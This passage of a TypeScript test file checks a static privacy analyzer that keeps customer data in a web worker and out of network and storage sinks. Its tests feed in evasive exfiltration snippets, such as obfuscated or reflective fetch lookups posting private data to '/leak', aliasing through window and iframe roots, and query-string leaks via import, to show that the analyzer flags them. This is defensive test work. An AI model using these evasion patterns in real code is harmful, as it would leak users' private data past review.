        if (reflected !== null) report(node, `reflective network capability lookup ${reflected}`);
      }
      if (ts.isIdentifier(node.expression) && sinkAliases.has(node.expression.text)) {
        report(node, `network sink alias ${node.expression.text}`);
      }
      if (
        ts.isIdentifier(node.expression)
        && networkCapabilities.has(node.expression.text)
        && !allowedFetchCall(node)
      ) report(node, `network sink ${node.expression.text}`);
      for (const resolvedName of names) {
        if (networkCapabilities.has(resolvedName) && !allowedFetchCall(node)) {
          report(node, `network sink ${resolvedName}`);
        }
      }
      if (name === "fetcher" && !allowedFetchCall(node)) report(node, "unapproved bootstrap fetch alias");
      if (root === "console") report(node, "console sink in customer boundary");
      if (/analytics|telemetry|track|capture/i.test(name ?? "")) report(node, `analytics sink ${name}`);
      if (
        ["URL", "pushState", "replaceState", "setItem", "put", "add"].includes(name ?? "")
        && args.some(containsSensitiveInput)
      ) report(node, `${name} receives customer source or answers`);
      if (name === "postMessage" && args.some(containsSensitiveInput)) {
        const allowed = relativeName === "lib/browser-review-client.ts"
          || reviewedFindingsClientPostMessage(node)
          || reviewedWorkerPostMessage(node);
        if (!allowed) report(node, "customer input crosses an unapproved message boundary");
      }
      if (
        name === "postMessage"
        && relativeName === "lib/findings-sync-client.ts"
        && !reviewedFindingsClientPostMessage(node)
      ) report(node, "findings projection crosses an unapproved message boundary");
      if (
        name === "postMessage"
        && relativeName === "workers/heel-review.worker.ts"
        && !reviewedWorkerPostMessage(node)
      ) report(node, "worker output crosses an unapproved message boundary");
    }
    ts.forEachChild(node, visit);
  }
  visit(parsed);
  if (engineWorker) {
    validateCriticalWorkerBindings();
    validateDynamicImportContract();
    validateBootstrapRevocationContract();
    validateFindingsProjectionContract();
  }
  if (serverWorker) validateControlPlaneProxyContract();
  if (controlPlaneClient) validateControlPlaneClientContract();
  return violations;
}


test("keeps customer source in the worker message path and out of durable or network sinks", async () => {
  const files = await discoverOriginalSources(appRootPath);
  assert.ok(files.some((file) => file.endsWith("lib/browser-review-client.ts")));
  assert.ok(files.some((file) => file.endsWith("workers/heel-review.worker.ts")));
  const violations = [];
  for (const file of files) violations.push(...analyzeSource(file, await readFile(file, "utf8")));
  assert.deepEqual(violations, []);

  const localReviews = await source("lib/local-reviews.ts");
  assert.match(localReviews, /sync_state:\s*["']local_only["']/);
});


test("pins the findings message, result, busy-state, and key-zeroization boundaries", async () => {
  const client = await source("lib/findings-sync-client.ts");
  const worker = await source("workers/heel-review.worker.ts");
  const clientMutations = [
    client.replace(
      "      namespace_key: namespaceBuffer,",
      "      namespace_key: namespaceBuffer,\n      raw_review: pending.reviewJson,",
    ),
    client.replace(
      "      worker.postMessage(message, [namespaceBuffer]);",
      "      worker.postMessage(message, []);",
    ),
  ];
  for (const [index, candidate] of clientMutations.entries()) {
    const violations = analyzeSource(join(appRootPath, "lib/findings-sync-client.ts"), candidate);
    assert.ok(
      violations.some((violation) => violation.includes("unapproved message boundary")),
      `${index}: ${violations.join("\n")}`,
    );
  }

  const workerMutations = [
    worker.replace("    namespaceKey.fill(0);", ""),
    worker.replace("    if (ownsOperation) reviewing = false;", "    reviewing = false;"),
    worker.replace("        new Uint8Array(event.data.namespace_key).fill(0);", ""),
    worker.replace(
      "      request_json: requestJson,",
      "      request_json: requestJson,\n      raw_review: request.review_json,",
    ),
  ];
  for (const [index, candidate] of workerMutations.entries()) {
    const violations = analyzeSource(join(appRootPath, "workers/heel-review.worker.ts"), candidate);
    assert.ok(
      violations.some((violation) => violation.includes("findings worker")),
      `${index}: ${violations.join("\n")}`,
    );
  }
});


test("the privacy analyzer detects constant-computed global network mutation", () => {
  const mutation = `
const source = "private";
globalThis["fet" + "ch"]("/leak", {body: source});
`;
  const violations = analyzeSource(join(appRootPath, "components/nested/mutation.ts"), mutation);
  assert.ok(violations.some((violation) => violation.includes("network sink fetch")), violations.join("\n"));
});


test("the privacy analyzer detects an executable direct fetch alias", () => {
  const mutation = `
const source = "private";
const sink = fetch;
sink("/leak", {body: source});
`;
  const violations = analyzeSource(join(appRootPath, "components/nested/alias-mutation.ts"), mutation);
  assert.ok(violations.some((violation) => violation.includes("network sink alias sink")), violations.join("\n"));
});


test("the privacy analyzer follows computed-global destructuring and assignment aliases", () => {
  const mutation = `
const source = "private";
const { ["fet" + "ch"]: sink } = globalThis;
let nested;
nested = sink;
nested("/leak", {body: source});
`;
  const violations = analyzeSource(join(appRootPath, "components/nested/propagated-alias.ts"), mutation);
  assert.ok(violations.some((violation) => violation.includes("network sink alias sink")), violations.join("\n"));
  assert.ok(violations.some((violation) => violation.includes("network sink alias nested")), violations.join("\n"));
});


test("the privacy analyzer rejects property and object carriers at capability acquisition", () => {
  const mutations = [
    `
const source = "private";
const holder = {};
holder.sink = fetch;
holder.sink("/leak", {body: source});
`,
    `
const source = "private";
const holder = {sink: fetch};
holder.sink("/leak", {body: source});
`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, `components/nested/property-carrier-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("network sink capability reference fetch")),
      violations.join("\n"),
    );
  }
});


test("the privacy analyzer rejects array, closure, return, and argument carriers", () => {
  const mutations = [
    `const holder = [fetch]; holder[0]("/leak");`,
    `const holder = () => fetch; holder()("/leak");`,
    `function holder() { return fetch; } holder()("/leak");`,
    `const carry = (authority) => authority; carry(fetch)("/leak");`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, `components/nested/authority-carrier-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("network sink capability reference fetch")),
      violations.join("\n"),
    );
  }
});


test("the privacy analyzer rejects Reflect get, apply, and construct retrieval", () => {
  const mutations = [`
const source = "private";
const sink = Reflect.get(globalThis, "fet" + "ch");
sink("/leak", {body: source});
`, `
const sink = Reflect.apply(Reflect.get, Reflect, [globalThis, "fetch"]);
`, `
const Socket = Reflect.construct(Reflect.get(globalThis, "Web" + "Socket"), ["wss://invalid"]);
`];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(join(appRootPath, `components/nested/reflect-${index}.ts`), mutation);
    assert.ok(
      violations.some((violation) => violation.includes("reflective network capability lookup")),
      violations.join("\n"),
    );
  }
});


test("the privacy analyzer rejects descriptor and legacy getter retrieval", () => {
  const mutations = [
    `const sink = Object.getOwnPropertyDescriptor(globalThis, "fetch").value;`,
    `const sink = globalThis.__lookupGetter__("fet" + "ch");`,
    `const sink = Object.prototype.__lookupGetter__.call(globalThis, "fetch");`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, `components/nested/reflective-getter-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("reflective network capability lookup fetch")),
      violations.join("\n"),
    );
  }
});


test("the privacy analyzer rejects reflective method references in every carrier", () => {
  const mutations = [
    `const get = Reflect.get;`,
    `const descriptor = Object.getOwnPropertyDescriptor;`,
    `const holder = {sink: Reflect["g" + "et"]};`,
    `const holder = {}; holder.sink = Object["getOwn" + "PropertyDescriptor"];`,
    `const legacy = globalThis["__lookup" + "Getter__"];`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, `components/nested/reflective-authority-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("reflective method authority reference")),
      violations.join("\n"),
    );
  }
});


test("the privacy analyzer rejects copying Reflect and Object roots", () => {
  const mutations = [
    `const R = Reflect; R.get(globalThis, "fetch");`,
    `const O = Object; O.getOwnPropertyDescriptor(globalThis, "fetch");`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, `components/nested/reflective-root-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("reflective root authority reference")),
      violations.join("\n"),
    );
  }
});


test("the privacy analyzer rejects ambient-root copying and variable-key destructuring", () => {
  const mutations = [
    `const key = "fetch"; const {[key]: sink} = globalThis;`,
    `const root = globalThis; root.fetch("/leak");`,
    `const carry = (value) => value; carry(window);`,
    `function copied() { return self; }`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, `components/nested/ambient-root-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("ambient root authority reference")),
      violations.join("\n"),
    );
  }
});


test("the privacy analyzer rejects Window authority through document, top, parent, and frames", () => {
  const roots = ["document.defaultView", "top", "parent", "frames"];
  for (const [index, root] of roots.entries()) {
    const mutation = `
const source = "private";
const key = "fetch";
const {[key]: sink} = ${root};
sink("/leak", {body: source});
`;
    const violations = analyzeSource(
      join(appRootPath, `components/nested/window-root-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("ambient root authority reference")),
      violations.join("\n"),
    );
  }
});


test("the privacy analyzer rejects DOM-derived Window and document carriers regardless of base", () => {
  const mutations = [
    `const element = {} as HTMLElement; const {fetch: sink} = element.ownerDocument.defaultView;`,
    `const frame = {} as HTMLIFrameElement; const root = frame.contentWindow;`,
    `const frame = {} as HTMLIFrameElement; const root = frame["content" + "Document"];`,
    `const element = {} as HTMLElement; const root = element.ownerDocument["default" + "View"];`,
    `const element = {} as HTMLElement; const {["default" + "View"]: root} = element.ownerDocument;`,
    `const frame = {} as HTMLIFrameElement; const {contentWindow: root} = frame;`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, `components/nested/dom-window-carrier-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("runtime Window/document authority carrier")),
      `${index}: ${violations.join("\n")}`,
    );
  }
});


test("the privacy analyzer resolves direct const keys for DOM carriers and network sinks", () => {
  const mutations = [
    `
const documentCarrier = element.ownerDocument as Record<string, unknown>;
const viewKey = "default" + "View";
const root = documentCarrier[viewKey] as Record<string, unknown>;
const sinkKey = "fetch";
const sink = root[sinkKey];
sink("/leak");
`,
    `
const windowKey = "content" + "Window";
const root = frame[windowKey] as Record<string, unknown>;
const sinkKey = "fet" + "ch";
root[sinkKey]("/leak");
`,
    `
const documentKey = "contentDocument";
const {[documentKey]: documentCarrier} = frame;
const viewKey = "defaultView";
const {[viewKey]: root} = documentCarrier;
const sinkKey = "fetch";
const {[sinkKey]: sink} = root;
sink("/leak");
`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, `components/nested/const-dom-carrier-${index}.ts`),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("runtime Window/document authority carrier")),
      `${index}: ${violations.join("\n")}`,
    );
    assert.ok(
      violations.some((violation) => violation.includes("network sink")),
      `${index}: ${violations.join("\n")}`,
    );
  }

  const safe = `
const valueKey = "val" + "ue";
const value = record[valueKey];
const contentTypeKey = "content" + "Type";
const contentType = response[contentTypeKey];
`;
  assert.deepEqual(
    analyzeSource(join(appRootPath, "components/nested/const-safe-key.ts"), safe),
    [],
  );
});


test("the privacy analyzer rejects destructuring and copying the reviewed worker scope alias", () => {
  const mutations = [
    `const key = "fetch"; const {[key]: sink} = scope;`,
    `const copied = scope;`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const sourceText = `
const scope = globalThis as unknown as DedicatedWorkerGlobalScope;
${mutation}
`;
    const violations = analyzeSource(join(appRootPath, "workers/heel-review.worker.ts"), sourceText);
    assert.ok(
      violations.some((violation) => violation.includes("worker ambient alias authority reference scope")),
      `${index}: ${violations.join("\n")}`,
    );
  }
});


test("the privacy analyzer rejects direct use of the captured bootstrap fetch authority", () => {
  const mutation = `
const scope = globalThis as unknown as DedicatedWorkerGlobalScope;
let bootstrapFetch: typeof fetch | null = scope.fetch.bind(scope);
const source = "private";
bootstrapFetch("/leak", {method: "POST", body: source});
`;
  const violations = analyzeSource(join(appRootPath, "workers/heel-review.worker.ts"), mutation);
  assert.ok(
    violations.some((violation) => violation.includes("bootstrap fetch authority reference bootstrapFetch")),
    violations.join("\n"),
  );
});


test("the privacy analyzer requires the exact reviewed bootstrap declaration", () => {
  const declarations = [
    `const bootstrapFetch: typeof fetch | null = scope.fetch.bind(scope);`,
    `var bootstrapFetch: typeof fetch | null = scope.fetch.bind(scope);`,
    `let bootstrapFetch = scope.fetch.bind(scope);`,
  ];
  for (const [index, declaration] of declarations.entries()) {
    const mutation = `
const scope = globalThis as unknown as DedicatedWorkerGlobalScope;
${declaration}
`;
    const violations = analyzeSource(join(appRootPath, "workers/heel-review.worker.ts"), mutation);
    assert.ok(
      violations.some((violation) => violation.includes("unreviewed bootstrap fetch authority declaration")),
      `${index}: ${violations.join("\n")}`,
    );
  }
});


test("the privacy analyzer rejects bootstrap aliases, passing, return, reassignment, destructuring, and optional calls", () => {
  const prefix = `
const scope = globalThis as unknown as DedicatedWorkerGlobalScope;
let bootstrapFetch: typeof fetch | null = scope.fetch.bind(scope);
`;
  const mutations = [
    `const alias = bootstrapFetch;`,
    `function pass(value) {} pass(bootstrapFetch);`,
    `function expose() { return bootstrapFetch; }`,
    `const [alias] = [bootstrapFetch];`,
    `bootstrapFetch = () => Promise.reject(new Error("changed"));`,
    `bootstrapFetch?.("/leak");`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, "workers/heel-review.worker.ts"),
      `${prefix}\n${mutation}`,
    );
    assert.ok(
      violations.some((violation) => violation.includes("bootstrap fetch authority reference bootstrapFetch")),
      `${index}: ${violations.join("\n")}`,
    );
  }
});


test("the privacy analyzer rejects non-runtime fetcher calls inside fetchLocal", () => {
  const mutation = `
const scope = globalThis as unknown as DedicatedWorkerGlobalScope;
let bootstrapFetch: typeof fetch | null = scope.fetch.bind(scope);
async function fetchLocal(path: string): Promise<Response> {
  const fetcher = bootstrapFetch;
  if (fetcher === null) throw new Error("unavailable");
  return fetcher("/leak", {method: "POST", body: "private"});
}
`;
  const violations = analyzeSource(join(appRootPath, "workers/heel-review.worker.ts"), mutation);
  assert.ok(
    violations.some((violation) => violation.includes("bootstrap fetch authority reference fetcher")),
    violations.join("\n"),
  );
});


test("the privacy analyzer rejects every unreviewed fetchLocal reference and call shape", () => {
  const mutations = [
    `void fetchLocal(RUNTIME_ROOT + "pyodide.mjs?source=" + encodeURIComponent(request.source));`,
    `const alias = fetchLocal;`,
    `function pass(value) {} pass(fetchLocal);`,
    `function expose() { return fetchLocal; }`,
    `fetchLocal?.(WHEEL_URL);`,
    `({fetchLocal})["fetch" + "Local"](WHEEL_URL);`,
    `fetchLocal("/heel-runtime/runtime-manifest.json");`,
    `async function boot() { const delayed = () => fetchLocal(WHEEL_URL); }`,
    `async function boot() { const WHEEL_URL = RUNTIME_ROOT + request.source; await fetchLocal(WHEEL_URL); }`,
  ];
  for (const [index, mutation] of mutations.entries()) {
    const violations = analyzeSource(
      join(appRootPath, "workers/heel-review.worker.ts"),
      mutation,
    );
    assert.ok(
      violations.some((violation) => violation.includes("fetchLocal authority reference")),
      `${index}: ${violations.join("\n")}`,
    );
  }
});


test("the privacy analyzer rejects the exact post-boot fetchLocal mutation and missing revocations", async () => {
  const worker = await source("workers/heel-review.worker.ts");
  assert.equal(worker.match(/bootstrapFetch = null;/g)?.length, 2);
  assert.deepEqual(analyzeSource(join(appRootPath, "workers/heel-review.worker.ts"), worker), []);

  const mutation = worker
    .replaceAll("    bootstrapFetch = null;\n", "")
    .replace(
      "    const response = reviewEntry(request.source, request.answers_json);",
      `    void fetchLocal(RUNTIME_ROOT + "pyodide.mjs?source=" + encodeURIComponent(request.source));
    const response = reviewEntry(request.source, request.answers_json);`,
    );
  const mutationViolations = analyzeSource(
    join(appRootPath, "workers/heel-review.worker.ts"),
    mutation,
  );
  assert.ok(
    mutationViolations.some((violation) => violation.includes("fetchLocal authority reference")),
    mutationViolations.join("\n"),
  );
  assert.ok(
    mutationViolations.some((violation) => violation.includes("bootstrap fetch revocation contract")),
    mutationViolations.join("\n"),
  );

  const missingSuccess = worker.replace(
    "    guardAmbientNetwork();\n    bootstrapFetch = null;",
    "    guardAmbientNetwork();",
  );
  const missingFailure = worker.replace(
    "    acceptingInput = false;\n    bootstrapFetch = null;",
    "    acceptingInput = false;",
  );
  for (const [index, candidate] of [missingSuccess, missingFailure].entries()) {
    const violations = analyzeSource(
      join(appRootPath, "workers/heel-review.worker.ts"),
      candidate,
    );
    assert.ok(
      violations.some((violation) => violation.includes("bootstrap fetch revocation contract")),
      `${index}: ${violations.join("\n")}`,
    );
  }

  const shadowedConstant = worker.replace(
    "async function boot(): Promise<void> {",
    `async function boot(WHEEL_URL = "/heel-runtime/leak"): Promise<void> {`,
  );
  const shadowViolations = analyzeSource(
    join(appRootPath, "workers/heel-review.worker.ts"),
    shadowedConstant,
  );
  assert.ok(
    shadowViolations.some((violation) => violation.includes("bootstrap fetch revocation contract")),
    shadowViolations.join("\n"),
  );
});


test("the privacy analyzer rejects composed boot reentry, URL shadowing, and early readiness", async () => {
  const worker = await source("workers/heel-review.worker.ts");
  const shadow = `    const {RUNTIME_MANIFEST_URL} = {
      RUNTIME_MANIFEST_URL: RUNTIME_ROOT + "runtime-manifest.json?source=" + encodeURIComponent(leakedSource),
    };
`;
  const earlyReady = `    {
      acceptingInput = true;
      send({ type: "ready", protocol_version: WORKER_PROTOCOL_VERSION });
      return;
    }
`;
  const composite = worker
    .replace("let reviewing = false;", `let reviewing = false;\nlet leakedSource = "";`)
    .replace("    const manifestResponse", `${shadow}    const manifestResponse`)
    .replace("    guardDynamicPackages(pyodide);", `${earlyReady}    guardDynamicPackages(pyodide);`)
    .replace(
      "    request = parseRequest(event.data);",
      `    request = parseRequest(event.data);
    leakedSource = request.source;
    void boot();`,
    );
  const compositeViolations = analyzeSource(
    join(appRootPath, "workers/heel-review.worker.ts"),
    composite,
  );
  for (const expected of [
    "runtime URL constant binding",
    "boot authority reference",
    "boot readiness contract",
  ]) {
    assert.ok(
      compositeViolations.some((violation) => violation.includes(expected)),
      `${expected}: ${compositeViolations.join("\n")}`,
    );
  }

  const variants = [
    [worker.replace("    const manifestResponse", `${shadow}    const manifestResponse`), "runtime URL constant binding"],
    [worker.replace("    request = parseRequest(event.data);", "    request = parseRequest(event.data);\n    void boot();"), "boot authority reference"],
    [worker.replace("    guardDynamicPackages(pyodide);", `${earlyReady}    guardDynamicPackages(pyodide);`), "boot readiness contract"],
    [worker.replace("    guardDynamicPackages(pyodide);", "    acceptingInput ||= true;\n    guardDynamicPackages(pyodide);"), "boot readiness contract"],
    [worker.replace(
      `    send({ type: "ready", protocol_version: WORKER_PROTOCOL_VERSION });`,
      `    send({ type: "ready", protocol_version: WORKER_PROTOCOL_VERSION, source: leakedSource });`,
    ), "boot readiness contract"],
  ];
  for (const [index, [candidate, expected]] of variants.entries()) {
    const violations = analyzeSource(
      join(appRootPath, "workers/heel-review.worker.ts"),
      candidate,
    );
    assert.ok(
      violations.some((violation) => violation.includes(expected)),
      `${index}: ${violations.join("\n")}`,
    );
  }
});


test("the privacy analyzer allows only the reviewed boot-time dynamic import", async () => {
  const worker = await source("workers/heel-review.worker.ts");
  assert.deepEqual(analyzeSource(join(appRootPath, "workers/heel-review.worker.ts"), worker), []);
  const mutation = worker.replace(
    "    const response = reviewEntry(request.source, request.answers_json);",
    `    void import(/* @vite-ignore */ (RUNTIME_MODULE_URL + "?source=" + encodeURIComponent(request.source)));
    const response = reviewEntry(request.source, request.answers_json);`,
  );
  const violations = analyzeSource(
    join(appRootPath, "workers/heel-review.worker.ts"),
    mutation,
  );
  assert.ok(
    violations.some((violation) => violation.includes("dynamic import authority")),
    violations.join("\n"),
  );

  const variants = [
    `void import(RUNTIME_MODULE_URL);`,
    `async function boot() { await import(RUNTIME_MODULE_URL + "?query=1"); }`,
    `const load = (path) => import(path); load(RUNTIME_MODULE_URL);`,
    `importScripts(RUNTIME_MODULE_URL);`,
  ];
  for (const [index, candidate] of variants.entries()) {
    const candidateViolations = analyzeSource(
      join(appRootPath, "workers/heel-review.worker.ts"),
      candidate,
    );
    assert.ok(
      candidateViolations.some((violation) => (
        violation.includes("dynamic import authority")
        || violation.includes("network sink importScripts")
      )),
      `${index}: ${candidateViolations.join("\n")}`,
    );
  }
});


test("the privacy analyzer rejects every lexical shadow of critical worker authority", async () => {
  const worker = await source("workers/heel-review.worker.ts");
  const exactShadow = worker.replace(
    "  try {\n    const manifestResponse",
    `  try {
    let {bootstrapFetch} = {bootstrapFetch: null};
    const {guardAmbientNetwork} = {guardAmbientNetwork() {}};
    const manifestResponse`,
  );
  const exactViolations = analyzeSource(
    join(appRootPath, "workers/heel-review.worker.ts"),
    exactShadow,
  );
  for (const name of ["bootstrapFetch", "guardAmbientNetwork"]) {
    assert.ok(
      exactViolations.some((violation) => violation.includes(`critical worker binding ${name}`)),
      `${name}: ${exactViolations.join("\n")}`,
    );
  }

  const variants = [
    [worker.replace(
      "async function boot(): Promise<void> {",
      "async function boot(send = () => {}): Promise<void> {",
    ), "send"],
    [worker.replace(
      "  try {\n    const manifestResponse",
      "  try {\n    function fetchLocal() {}\n    const manifestResponse",
    ), "fetchLocal"],
    [worker.replace(
      "  try {\n    const manifestResponse",
      "  try {\n    class scope {}\n    const manifestResponse",
    ), "scope"],
  ];
  for (const [index, [candidate, name]] of variants.entries()) {
    const candidateViolations = analyzeSource(
      join(appRootPath, "workers/heel-review.worker.ts"),
      candidate,
    );
    assert.ok(
      candidateViolations.some((violation) => violation.includes(`critical worker binding ${name}`)),
      `${index}: ${candidateViolations.join("\n")}`,
    );
  }
});


test("the privacy analyzer permits only the reviewed engine and server fetch sites", () => {
  const engine = `
const RUNTIME_ROOT = "/heel-runtime/";
const RUNTIME_MODULE_URL = "/heel-runtime/pyodide.mjs";
const RUNTIME_MANIFEST_URL = "/heel-runtime/runtime-manifest.json";
const WHEEL_FILENAME = "heel.whl";
const WHEEL_URL = \`\${RUNTIME_ROOT}\${WHEEL_FILENAME}\`;
const scope = globalThis as unknown as DedicatedWorkerGlobalScope;
let bootstrapFetch: typeof fetch | null = scope.fetch.bind(scope);
let reviewEntry: PyodideCallable | null = null;
let findingsEntry: PyodideCallable | null = null;
async function fetchLocal(path: string): Promise<Response> {
  const fetcher = bootstrapFetch;
  if (fetcher === null || !path.startsWith(RUNTIME_ROOT) || path.includes("..")) {
    throw new Error("runtime asset path is unavailable");
  }
  const response = await fetcher(path, {
    cache: "no-store",
    credentials: "same-origin",
    redirect: "error",
  });
  new URL(response.url || path, scope.location.href);
  return response;
}
function send(value: Record<string, unknown>): void { scope.postMessage(JSON.stringify(value)); }
function guardProperty(owner: Record<string, unknown>, name: string): void {
  Object.defineProperty(owner, name, {value: () => { throw new Error("disabled"); }});
}
function guardAmbientNetwork(): void {
  const ambient = scope as unknown as Record<string, unknown>;
  for (const name of ["fetch", "XMLHttpRequest", "WebSocket", "EventSource"]) {
    guardProperty(ambient, name);
  }
}
function guardDynamicPackages(pyodide: HeelPyodideRuntime): void {}
scope.onmessage = () => {};
let acceptingInput = false;
async function boot(): Promise<void> {
  try {
    await fetchLocal(RUNTIME_MANIFEST_URL);
    await fetchLocal(WHEEL_URL);
    await import(/* @vite-ignore */ RUNTIME_MODULE_URL);
    guardDynamicPackages({} as HeelPyodideRuntime);
    guardAmbientNetwork();
    bootstrapFetch = null;
    acceptingInput = true;
    send({type: "ready", protocol_version: WORKER_PROTOCOL_VERSION});
  } catch {
    acceptingInput = false;
    bootstrapFetch = null;
    send({
      type: "fatal",
      protocol_version: WORKER_PROTOCOL_VERSION,
      code: "engine_unavailable",
      message: PUBLIC_ERRORS.engine_unavailable,
    });
  }
}
void boot();
`;
  const server = `
async function route(request, env, ctx) {
  const asset = await env.ASSETS.fetch(request);
  return handler.fetch(asset, env, ctx);
}
`;
  assert.deepEqual(
    analyzeSource(join(appRootPath, "workers/heel-review.worker.ts"), engine),
    [],
  );
  assert.deepEqual(
    analyzeSource(join(appRootPath, "worker/index.ts"), server),
    [],
  );
  assert.deepEqual(
    analyzeSource(join(appRootPath, "lib/safe-object.ts"), `
Object.freeze({});
Object.entries({});
Object.keys({});
Object.is(0, -0);
Object.fromEntries([]);
`),
    [],
  );
  assert.deepEqual(
    analyzeSource(
      join(appRootPath, "lib/local-reviews.ts"),
      `const database = globalThis.indexedDB;`,
    ),
    [],
  );
  assert.deepEqual(
    analyzeSource(
      join(appRootPath, "lib/findings-sync-queue.ts"),
      `const database = globalThis.indexedDB; const ranges = globalThis.IDBKeyRange;`,
    ),
    [],
  );
  assert.match(
    analyzeSource(
      join(appRootPath, "components/review/Unreviewed.tsx"),
      `const ranges = globalThis.IDBKeyRange;`,
    ).join("\n"),
    /IndexedDB capability outside an approved local-only store/,
  );
});


test("the privacy analyzer pins the private control-plane fetch and route allowlist", async () => {
  const worker = await source("worker/index.ts");
  assert.deepEqual(analyzeSource(join(appRootPath, "worker/index.ts"), worker), []);
  const mutations = [
    {
      label: "fetch location",
      source: worker.replace(
        "async function proxyControlPlane(",
        "async function movedControlPlane(",
      ),
      violation: "network sink",
    },
    {
      label: "fetch callee",
      source: worker.replace(
        "env.CONTROL_PLANE.fetch(new Request(upstreamUrl, init))",
        'env.CONTROL_PLANE["fetch"](new Request(upstreamUrl, init))',
      ),
      violation: "network sink",
    },
    {
      label: "route broadening",
      source: worker.replace('  return "";\n}', "  return upstreamPath;\n}"),
      violation: "route allowlist is not the reviewed exact contract",
    },
    {
      label: "caller-derived upstream query",
      source: worker.replace(
        "const upstreamUrl = new URL(upstreamPath, controlPlaneOrigin);",
        "const upstreamUrl = new URL(upstreamPath + new URL(request.url).search, controlPlaneOrigin);",
      ),
      violation: "missing exact const upstreamUrl",
    },
    {
      label: "public fetch fallback",
      source: worker.replace(
        "const response = await env.CONTROL_PLANE.fetch(new Request(upstreamUrl, init));",
        "const response = await fetch(new Request(upstreamUrl, init));",
      ),
      violation: "network sink",
    },
    {
      label: "request-derived destination",
      source: worker.replace(
        "const upstreamUrl = new URL(upstreamPath, controlPlaneOrigin);",
        "const upstreamUrl = new URL(upstreamPath, new URL(request.url).origin);",
      ),
      violation: "not built only from the validated configured origin",
    },
    {
      label: "legacy fixed destination",
      source: worker.replace(
        "const upstreamUrl = new URL(upstreamPath, controlPlaneOrigin);",
        'const upstreamUrl = new URL(upstreamPath, "https://heel-control-plane.internal");',
      ),
      violation: "fixed private hostname",
    },
    {
      label: "unvalidated configured destination",
      source: worker.replace(
        "const controlPlaneOrigin = canonicalPublicOrigin(env.PUBLIC_ORIGIN);",
        "const controlPlaneOrigin = env.PUBLIC_ORIGIN ?? null;",
      ),
      violation: "not the validated configured origin",
    },
    {
      label: "reassignable destination",
      source: worker.replace(
        "const controlPlaneOrigin = canonicalPublicOrigin(env.PUBLIC_ORIGIN);",
        "let controlPlaneOrigin = canonicalPublicOrigin(env.PUBLIC_ORIGIN);",
      ),
      violation: "not the validated configured origin",
    },
    {
      label: "raw configured origin elsewhere",
      source: worker.replace(
        "      controlPlaneOrigin,\n      edgeClientKey,",
        "      env.PUBLIC_ORIGIN,\n      edgeClientKey,",
      ),
      violation: "not the validated configured origin",
    },
    {
      label: "missing configuration refusal",
      source: worker.replace(
        '  if (controlPlaneOrigin === null) return proxyError(503, "control plane unavailable", csp);\n',
        "",
      ),
      violation: "refusal does not precede every private fetch",
    },
    {
      label: "conditional configuration refusal",
      source: worker.replace(
        'if (controlPlaneOrigin === null) return proxyError(503, "control plane unavailable", csp);',
        'if (controlPlaneOrigin === null && upstreamPath !== ME_ROUTE) return proxyError(503, "control plane unavailable", csp);',
      ),
      violation: "refusal does not precede every private fetch",
    },
    {
      label: "substitute validator module",
      source: worker.replace(
        'import { canonicalPublicOrigin } from "../build/deployment-config";',
        'import { canonicalPublicOrigin } from "./deployment-config";',
      ),
      violation: "not the shared canonical import",
    },
    {
      label: "aliased validator import",
      source: worker.replace(
        'import { canonicalPublicOrigin } from "../build/deployment-config";',
        'import { deploymentConfig as canonicalPublicOrigin } from "../build/deployment-config";',
      ),
      violation: "not the shared canonical import",
    },
    {
      label: "shadowed validator",
      source: worker.replace(
        "  const controlPlaneOrigin = canonicalPublicOrigin(env.PUBLIC_ORIGIN);",
        "  const canonicalPublicOrigin = (value: unknown) => String(value);\n  const controlPlaneOrigin = canonicalPublicOrigin(env.PUBLIC_ORIGIN);",
      ),
      violation: "not the validated configured origin",
    },
    {
      label: "unbounded request body",
      source: worker.replace(
        "request.body!.pipeThrough(new FixedLengthStream(requestContract.contentLength))",
        "request.body!",
      ),
      violation: "FixedLengthStream",
    },
    {
      label: "request header copying",
      source: worker.replace("const headers = new Headers();", "const headers = new Headers(source);"),
      violation: "request/response header allowlists",
    },
    {
      label: "response header copying",
      source: worker.replace(
        'function controlPlaneResponse(response: Response, csp: string, upstreamPath = ""): Response {\n  const headers = new Headers();',
        'function controlPlaneResponse(response: Response, csp: string, upstreamPath = ""): Response {\n  const headers = new Headers(response.headers);',
      ),
      violation: "request/response header allowlists",
    },
    {
      label: "redirect forwarding",
      source: worker.replace(
        "if (response.status >= 300 && response.status <= 399)",
        "if (response.status === 399)",
      ),
      violation: "response.status >= 300",
    },
    {
      label: "query acceptance",
      source: worker.replace(
        '      if (requestUrl.search !== "") return proxyError(400, "invalid control plane request", csp);\n',
        "",
      ),
      violation: "requestUrl.search",
    },
  ];
  for (const mutation of mutations) {
    assert.notEqual(mutation.source, worker, `${mutation.label} mutation did not apply`);
    const violations = analyzeSource(join(appRootPath, "worker/index.ts"), mutation.source);
    assert.ok(
      violations.some((violation) => violation.includes(mutation.violation)),
      `${mutation.label}: ${violations.join("\n")}`,
    );
  }
});


test("the edge keeps canary human and runner-result authorities on exact route and header families", async () => {
  const worker = await source("worker/index.ts");
  for (const fragment of [
